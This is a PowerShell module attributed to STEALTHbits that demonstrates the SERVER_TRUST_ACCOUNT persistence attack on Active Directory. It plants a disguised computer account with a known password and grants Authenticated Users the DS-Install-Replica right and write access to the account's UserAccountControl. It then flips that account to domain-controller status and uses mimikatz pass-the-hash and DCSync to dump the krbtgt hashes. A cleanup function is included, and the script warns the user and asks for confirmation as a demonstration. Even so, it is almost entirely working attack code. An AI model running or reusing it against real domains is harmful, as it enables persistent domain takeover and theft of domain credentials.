<# 
MIT License

Copyright (c) 2020 STEALTHbits Technologies

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
#>


<#
	.SYNOPSIS
		A function to setup a computer object with a known password and grant the necessary 
		permissions to exploit SERVER_TRUST_ACCOUNT persistence.
	
	.DESCRIPTION
		This function creates a computer object with a known password and grants the necessary 
		permissions to exploit SERVER_TRUST_ACCOUNT persistence. It is designed to run with
		domain administrator privileges and performs the following activities:
		  * Creates a computer object with a known password
		  * Creates new ACE on the domain object to grant AuthenticatedUsers the Ds-Install-Replica permission
		  * Creates new ACE on the created computer object to grant AuthenticatedUsers Write UserAccountControl permission 
	
	.PARAMETER DomainFQDN
		The fully qualified domain name of the domain. EG: corp.consto.com
	
	.PARAMETER ComputerName
		The name of the computer object that will be created. Ideally, reconnaissance will inform the choice of computer name
		and selecting a name that matches the target's naming convention will better disguise the account.
	
	.PARAMETER OSVersion
		OS Version to set on the created computer object to better disguise it.
	
	.PARAMETER OS
		Operating System name to set on the created computer object to better disguise it.
	
	.PARAMETER DNSName
		The FQDN to set as the computer's dnsHostName to better disguise it. Defaults to "ComputerName.DomainFQDN".
	
	.PARAMETER Password
		The password to set on the created computer account.
	
	.PARAMETER DomainDN
		The DistinguishedName of the domain.

	.PARAMETER MSA
		A switch to create a standalone Managed Service Account instead of a computer.

	.EXAMPLE
		Creates a computer object called "UK-Laptop1" and ACLs for "Authenticated Users"	

		PS C:\> Add-ServerUntrustAccount -ComputerName "UK-Laptop1"

	.EXAMPLE
		Creates an MSA called "SVC_SQL" and ACLs for "Authenticated Users"

		PS C:\> Add-ServerUntrustAccount -ComputerName "SVC_SQL" -MSA

#>
function Add-ServerUntrustAccount
{
	#Requires -Module ActiveDirectory
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory = $false)]
		[ValidateNotNullOrEmpty()]
		[System.String]$DomainFQDN = $ENV:USERDNSDOMAIN,
		[Parameter(Mandatory = $false)]
		[ValidateNotNull()]
		[ValidateNotNullOrEmpty()]
		[System.String]$ComputerName = 'FakeComputer1',
		[System.String]$OSVersion = '10.0 (18363)',
		[System.String]$OS = 'Windows 10 Enterprise',
		[System.String]$DNSName = "$ComputerName.$DomainFQDN",
		[ValidateNotNull()]
		[ValidateNotNullOrEmpty()]
		[System.String]$Password = 'IWantToBeADC123!',
		[ValidateNotNull()]
		[ValidateNotNullOrEmpty()]
		[System.String]$DomainDN = ([adsi]"" | Select-Object -ExpandProperty distinguishedname),
		[switch]$MSA
	)
	
	$Check_Confirmation = Read-Host @"
WARNING: This script is a demonstration of an attack technique and it will grant the Authenticated Users security
principal the DS-Install-Replica privilege in your domain. This privilege exposes the domain to a number of attack
vectors. Before running this script you should understand the full potential impact of this privilege. 
Be sure to remove this privilege (see the Remove-ServerUntrustAccount function) when testing is complete.
To continue, type CONFIRM
"@
	
	if ($Check_Confirmation -eq "CONFIRM")
	{
		
		#Convert Password to SecureString
		$Sec_Password = ConvertTo-SecureString -AsPlainText -Force -String $Password
		
		##############################
		### Create Computer or MSA ###
		##############################
		
		If ($MSA)
		{
			Write-Verbose -Message "Creating Managed Service Account: $ComputerName"
			New-ADServiceAccount -RestrictToSingleComputer -Name $ComputerName -Enabled $true -AccountPassword $Sec_Password -ErrorAction Stop
			Write-Verbose -Message "Created Managed Service Account: $ComputerName"
		} else
		{
			Write-Verbose -Message "Creating Computer Account: $ComputerName"
			New-ADComputer $ComputerName -AccountPassword $Sec_Password -Enabled $true -OperatingSystem $OS -OperatingSystemVersion $OS_Version -DNSHostName $DNSName -ErrorAction Stop
			Write-Verbose -Message "Created Computer Account: $ComputerName"
		}
		
		
		
		#####################################
		### Create DS-Install-Replica ACL ###
		#####################################
		
		Write-Verbose -Message "Starting DS-Install-Replica Permission Addition"
		$path = "AD:\$DomainDN"
		$acl = Get-Acl -Path $path -ErrorAction Stop
		
		$IdentityReference = New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList @([System.Security.Principal.WellKnownSidType]::AuthenticatedUserSid, $null)
		$AccessControlType = [System.Security.AccessControl.AccessControlType]::Allow
		$PropertyAccess = [System.DirectoryServices.PropertyAccess]::Write
		$GUID = [GUID]"9923a32a-3607-11d2-b9be-0000f87a36b2" # DS-Install-Replica Schema GUID (https://docs.microsoft.com/en-us/windows/win32/adschema/r-ds-install-replica)
		
		# https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.extendedrightaccessrule.-ctor?view=dotnet-plat-ext-3.1#System_DirectoryServices_ExtendedRightAccessRule__ctor_System_Security_Principal_IdentityReference_System_Security_AccessControl_AccessControlType_System_Guid_
		$ace = New-Object System.DirectoryServices.ExtendedRightAccessRule($IdentityReference, $AccessControlType, $GUID) -ErrorAction Stop
		$acl.AddAccessRule($ace)
		Write-Verbose -Message "DS-Install-Replica ACE added to ACL object. Attempting to set the ACL..."
		Set-Acl -Path $path -AclObject $acl -ErrorAction Stop
		Write-Verbose -Message "DS-Install-Replica Permission Successfully Added"
		
		#####################################
		### Create UserAccountControl ACL ###
		#####################################
		
		Write-Verbose "Starting UserAccountControl Permission Addition"
		if ($MSA -or $GMSA)
		{
			$DN_For_Path = Get-ADServiceAccount $ComputerName | Select-Object -ExpandProperty DistinguishedName
		} else
		{
			$DN_For_Path = Get-ADComputer $ComputerName | Select-Object -ExpandProperty DistinguishedName
		}
		$path = "AD:\$DN_For_Path"
		$acl = Get-Acl -Path $path -ErrorAction Stop
		
		$IdentityReference = New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList @([System.Security.Principal.WellKnownSidType]::AuthenticatedUserSid, $null)
		$AccessControlType = [System.Security.AccessControl.AccessControlType]::Allow
		$PropertyAccess = [System.DirectoryServices.PropertyAccess]::Write
		$GUID = [GUID]"bf967a68-0de6-11d0-a285-00aa003049e2" # User Account Control Schema GUID (https://docs.microsoft.com/en-us/windows/win32/adschema/a-useraccountcontrol)
		
		# https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.propertyaccessrule.-ctor?view=dotnet-plat-ext-3.1#System_DirectoryServices_PropertyAccessRule__ctor_System_Security_Principal_IdentityReference_System_Security_AccessControl_AccessControlType_System_DirectoryServices_PropertyAccess_System_Guid_
		$ace = New-Object System.DirectoryServices.PropertyAccessRule($IdentityReference, $AccessControlType, $PropertyAccess, $GUID) -ErrorAction Stop
		$acl.AddAccessRule($ace)
		Write-Verbose -Message "UserAccountControl ACE added to ACL object. Attempting to set the ACL..."
		Set-Acl -Path $path -AclObject $acl -ErrorAction Stop
		Write-Verbose -Message "UserAccountControl Permission Successfully Added"
	} else
	{
		Write-Host "Function aborted."
	}
}



<#
	.SYNOPSIS
		Regains domain dominance: sets UAC to 8192 and uses mimikatz to pass-the-hash and DCSync the krbtgt secret.

	.DESCRIPTION
		This function utilizes the permissions and computer object created by Add-ServerUntrustAccount in order to regain
		domain dominance. It sets the UAC bit flag for SERVER_TRUST_ACCOUNT, then uses mimikatz to pass-the-hash as the
		staged computer account, and finally performs a DCSync to replicate the krbtgt hashes.  It is designed to be run 
		by any authenticated user in the domain.

	.PARAMETER DomainFQDN
		The fully qualified domain name of the domain. EG: corp.consto.com
	
	.PARAMETER ComputerName
		The name of the computer that was created by Add-ServerUntrustAccount
	
	.PARAMETER Password
		The password set for the computer created by Add-ServerUntrustAccount

	.PARAMETER DomainNETBIOS
		The NetBIOS name of the domain. Defaults to the current user's domain.

	.PARAMETER MimikatzPath
		The path to mimikatz. Required to automate pass-the-hash and DCSync.

	.PARAMETER Raw
		Output an object containing the hashes instead of printing them to console.

	.PARAMETER ShowMimikatzOutput
		Print the raw mimikatz output to console.
	
	.EXAMPLE
				PS C:\> Invoke-ServerUntrustAccount -ComputerName "UK-Laptop1"

	.NOTES
		This Function requires DSInternals for the Hash Conversions. This can be installed by Install-Module DSInternals
		https://www.dsinternals.com/
	
#>
function Invoke-ServerUntrustAccount
{
	#Requires -Module  DSInternals
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory = $false)]
		[ValidateNotNullOrEmpty()]
		[ValidateNotNull()]
		[System.String]$DomainFQDN = $ENV:USERDNSDOMAIN,
		[ValidateNotNull()]
		[ValidateNotNullOrEmpty()]
		[System.String]$ComputerName = 'FakeComputer1',
		[ValidateNotNull()]
		[ValidateNotNullOrEmpty()]
		[System.String]$Password = 'IWantToBeADC123!',
		[System.String]$MimikatzPath,
		[System.String]$DomainNETBIOS = $ENV:USERDOMAIN,
		[System.String]$MimikatzTempLog = "$($ENV:Temp)\mimikatz.log",
		[switch]$ShowMimikatzOutput,
		[switch]$raw
	)
	
	##################################
	### Convert Password To Hashes ###
	##################################
	
	$Sec_Password = ConvertTo-SecureString -AsPlainText -Force -String $Password
	
	# Convert the Password to Hashes to be used later
	$NTHash = ConvertTo-NTHash -Password $Sec_Password #NTLM Hash
	
	# Creating SALT for Kerberos Key -> Format = "{DomainFQDN}host{FQDN of Computer}""
	$Salt = $DomainFQDN.ToUpper() + "host" + $ComputerName + "." + $DomainFQDN
	
	$KerberosKey = ConvertTo-KerberosKey -Password $Sec_Password -Salt $Salt -Iterations 4096 # All Kerberos Hashes
	
	$AES256 = $KerberosKey[0].ToString().split(" ")[-1] # Kerberos AES256 Hash
	$AES128 = $KerberosKey[1].ToString().split(" ")[-1] # Kerberos AES128 Hash

	# Setting UAC to 8192 on the Computer Object
	$Searcher = [adsisearcher]""
	$Searcher.Filter = "(&(objectclass=computer)(Name=$ComputerName))"
	$Searcher_Result = $Searcher.FindOne()
	$DirObj = $Searcher_Result.GetDirectoryEntry()
	if (-not $DirObj)
	{
		Write-Error -Message "Did not find the object $ComputerName in $($Searcher.SearchBase)"
	}
	else
	{
		Write-Verbose -Message "Found object: $ComputerName. Saving UAC Value ($($DirObj.useraccountcontrol)) Setting UAC to 8192 ..."
		$DirObj_OriginalUAC = $($DirObj.useraccountcontrol)
		$DirObj.useraccountcontrol = 8192
		$DirObj.CommitChanges()
		Write-Verbose -Message "$ComputerName is now in the DomainControllers group"
	}
	
	If ($MimikatzPath)
	{
		Write-Verbose -Message "Mimikatz Execution"
		
	
		if (Test-Path $MimikatzTempLog)
		{
			Remove-Item $MimikatzTempLog -Force -Confirm:$false
		}
		
        $Command = "sekurlsa::pth /user:$ComputerName$ /domain:$DomainFQDN /ntlm:$NTHash /aes128:$AES128 /aes256:$AES256 " + `
                   "/run:\`"mimikatz.exe \\`\`"log $MimikatzTempLog\\`\`" \\`\`"lsadump::dcsync /user:$DomainNETBIOS\krbtgt\\`\`" \\`\`"exit\\`\`"\`""

        Write-Verbose -Message $Command
		$Output = & $MimikatzPath $Command "exit"
		
		If ($ShowMimikatzOutput)
		{
			$Output
		}
		
		$i = 0
		Do
		{
			Start-Sleep 1
			$i = $i + 1
		}
		until ((Test-Path $MimikatzTempLog) -or ($i -eq 10))
		
		If ($i -eq 10)
		{
			Write-Error -Message "Unable to find Mimikatz Log: $MimikatzTempLog"
		}
		
		
		$Obj1 = New-Object -TypeName System.Management.Automation.PSObject
		$Obj1 | Add-Member -MemberType NoteProperty -Name "NTHash" -Value (Select-String -Pattern '^\s+Hash NTLM: ([a-z0-9]+)$' -Path $MimikatzTempLog | Select-Object -expand matches | Select-Object -expand groups | Select-Object -Last 1 | Select-Object -expand Value)
		$Obj1 | Add-Member -MemberType NoteProperty -Name "AES256" -Value (Select-String -Pattern '^\s+aes256_hmac\s+\(4096\) : ([a-z0-9]+)$' -Path $MimikatzTempLog | Select-Object -expand matches | Select-Object -expand groups | Select-Object -Last 1 | Select-Object -expand Value)
		$Obj1 | Add-Member -MemberType NoteProperty -Name "AES128" -Value (Select-String -Pattern '^\s+aes128_hmac\s+\(4096\) : ([a-z0-9]+)$' -Path $MimikatzTempLog | Select-Object -expand matches | Select-Object -expand groups | Select-Object -Last 1 | Select-Object -expand Value)
		
		
		if ($raw)
		{
			$Obj1
		}
		else
		{
			Write-Host "Hashes for KRBTGT:`n`tNTHash: $($Obj1.NTHash)`n`tAES128: $($Obj1.AES128)`n`tAES256: $($Obj1.AES256)"
		}
		
		# Setting UAC to to the Original UAC value on the Computer Object
		$Searcher = [adsisearcher]""
		$Searcher.Filter = "(&(objectclass=computer)(Name=$ComputerName))"
		$Searcher_Result = $Searcher.FindOne()
		$DirObj = $Searcher_Result.GetDirectoryEntry()
		if (-not $DirObj)
		{
			Write-Error -Message "Did not find the object $ComputerName in $($Searcher.SearchBase)"
		}
		else
		{
			Write-Verbose -Message "Found object: $ComputerName. Setting UAC back to the original UAC value ($DirObj_OriginalUAC)..."
			$DirObj.useraccountcontrol = $DirObj_OriginalUAC
			$DirObj.CommitChanges()
			Write-Verbose -Message "$ComputerName is no longer impersonating a domain controller"
		}
	}
}



<#
	.SYNOPSIS
		A function to remove the persistence configurations created by Add-ServerUntrustAccount.
	
	.DESCRIPTION
		This function can remove the following persistence configurations created by Add-ServerUntrustAccount:
			- Remove Security Principal with Ds-Install-Replica from the Domain Object
			- Remove the UserAccountControl Modification ACL from MSA/GMSA/Computer Object
			- Remove the Computer/MSA/GMSA, only when -DeleteComputer switch is specified.

	.PARAMETER ComputerName
		Specifies the MSA/Computer name of which to either delete or remove the UserAccountControl ACLs from.

		Default Value: FakeComputer1
		Type: String

	.PARAMETER DeleteComputer
		When specified the Computer Object will be deleted from Active Directory as clean up.

		Default Value: $False (not specified)
		Type: Switch 

	.PARAMETER DomainDN
		The Domain DistinguishedName of the domain in which it is intended to remove the Security Principal From the Ds-Install-Replica ACE

		Default Value: ([adsi]"" | Select-Object -ExpandProperty distinguishedname) -> Current Domain DistinguishedName
		Type: String

	.EXAMPLE
		Remove only ACE's but not the computer object

		Remove-ServerUntrustAccount -ComputerName "Computer1"

	.EXAMPLE
		Remove the ACE's and delete the computer object

		Remove-ServerUntrustAccount -ComputerName "Computer1" -DeleteComputer
	
#>
function Remove-ServerUntrustAccount
{
	#Requires -Module ActiveDirectory
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory = $false)]
		[ValidateNotNull()]
		[ValidateNotNullOrEmpty()]
		[System.String]$ComputerName = 'FakeComputer1',
		[switch]$DeleteComputer,
		[ValidateNotNull()]
		[ValidateNotNullOrEmpty()]
		[System.String]$DomainDN = ([adsi]"" | Select-Object -ExpandProperty distinguishedname)
	)
	
	#####################################
	### Remove DS-Install-Replica ACL ###
	#####################################
	
	Write-Verbose -Message "Starting DS-Install-Replica Permission Removal"
	$path = "AD:\$DomainDN"
	$acl = Get-Acl -Path $path -ErrorAction Stop
	
	# Get the ACE to remove from the current ACL
	$ACE_To_Remove = $acl.Access | Where-Object {
		$_.ActiveDirectoryRights -eq "ExtendedRight" -and $_.ObjectType -eq "9923a32a-3607-11d2-b9be-0000f87a36b2" -and $_.IdentityReference -eq "NT AUTHORITY\Authenticated Users"
	}
	
	if ($ACE_To_Remove)
	{
		
		$Output = $acl.RemoveAccessRule($ACE_To_Remove)
		
		if ($Output -eq $true)
		{
			Write-Verbose -Message "DS-Install-Replica ACE remove from the ACL object. Attempting to set the ACL..."
			Set-Acl -Path $path -AclObject $acl -ErrorAction Stop
			Write-Verbose -Message "DS-Install-Replica Permission Successfully Removed"
		} else
		{
			Write-Error -Message "Something went wrong when invoking the RemoveAccessRule."
		}
	} else
	{
		Write-Error -Message "No ACE Found for DS-Install-Replica and Authenticated Users on $DomainDN"
	}
	
	
	
	if (-not $DeleteComputer ){
		
		#####################################
		### Remove UserAccountControl ACL ###
		#####################################
			
		Write-Verbose "Starting UserAccountControl Permission Removal"
		# Using Get-ADObject as this can be a computer or a Managed Service Account	
		$Lookup_Computer = Get-ADObject -Filter {
			Name -eq $ComputerName
		}
		
		if ($Lookup_Computer.Count -gt 1)
		{
			Write-Error -Message "Found multiple objects with the name $ComputerName. Please clean up the ACL manually."
		} elseif (-not $Lookup_Computer)
		{
			Write-Error -Message "Did not find any objects with the name $ComputerName"
		} else
		{
			$path = "AD:\$($Lookup_Computer | Select-Object -ExpandProperty DistinguishedName)"
			$acl = Get-Acl -Path $path -ErrorAction Stop
			
			# Get the ACE to remove from the current ACL
			$ACE_To_Remove = $acl.Access | Where-Object {
				$_.ActiveDirectoryRights -eq "WriteProperty" -and $_.ObjectType -eq "bf967a68-0de6-11d0-a285-00aa003049e2" -and $_.IdentityReference -eq "NT AUTHORITY\Authenticated Users"
			}
			
			if ($ACE_To_Remove)
			{
				$Output = $acl.RemoveAccessRule($ACE_To_Remove)
				
				if ($Output -eq $true)
				{
					Write-Verbose -Message "UserAccountControl ACE removed from the ACL object. Attempting to set the ACL..."
					Set-Acl -Path $path -AclObject $acl -ErrorAction Stop
					Write-Verbose -Message "UserAccountControl Permission Successfully Removed"
				} else
				{
					Write-Error -Message "Something went wrong when invoking the RemoveAccessRule."
				}
			} else
			{
				Write-Error -Message "No ACE Found for UserAccountControl and Authenticated Users on $path"
			}
		}
	} else
	{
		#####################################
		### Delete Computer / MSA Account ###
		#####################################
		
		$Lookup_Computer = Get-ADObject -Filter {
			Name -eq $ComputerName
		}
		
		if ($Lookup_Computer.Count -gt 1)
		{
			Write-Error -Message "Found multiple objects with the name $ComputerName. Please delete this manually."
		} elseif (-not $Lookup_Computer)
		{
			Write-Error -Message "Did not find any objects with the name $ComputerName"
		} else
		{
			Write-Verbose -Message "Removing the object $($Lookup_Computer.DistinguishedName)."
			$Lookup_Computer | Remove-ADObject
		}
	}
}
